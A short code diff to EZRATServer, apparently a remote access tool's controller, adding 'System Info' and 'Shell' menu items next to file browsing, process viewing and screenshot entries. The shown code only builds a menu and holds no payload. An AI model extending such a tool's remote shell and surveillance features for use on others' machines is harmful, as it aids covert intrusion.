@@ -16,11 +16,17 @@ namespace EZRATServer.Utils
             ToolStripMenuItem menuChat = new ToolStripMenuItem("Chat",new Bitmap(Properties.Resources.chat_64));
             ToolStripMenuItem menuProcess = new ToolStripMenuItem("Process Viewer",new Bitmap(Properties.Resources.process_100));
             ToolStripMenuItem menuScreenShot = new ToolStripMenuItem("ScreenShot",new Bitmap(Properties.Resources.screenShot_100));
+            ToolStripMenuItem menuSysInfo = new ToolStripMenuItem("System Info",new Bitmap(Properties.Resources.computer_settings_64));
+            ToolStripMenuItem menuShell = new ToolStripMenuItem("Shell",new Bitmap(Properties.Resources.shell_48));
+            //ToolStripMenuItem menuMonitoring = new ToolStripMenuItem("ScreenShot",new Bitmap(Properties.Resources.monitor_64));
             this.CreateControl();
             this.Items.Add(menuFileBrowser);
             this.Items.Add(menuChat);
             this.Items.Add(menuProcess);
             this.Items.Add(menuScreenShot);
+            this.Items.Add(menuSysInfo);
+            this.Items.Add(menuShell);
+            //this.Items.Add(menuMonitoring);
         }
     }
 }
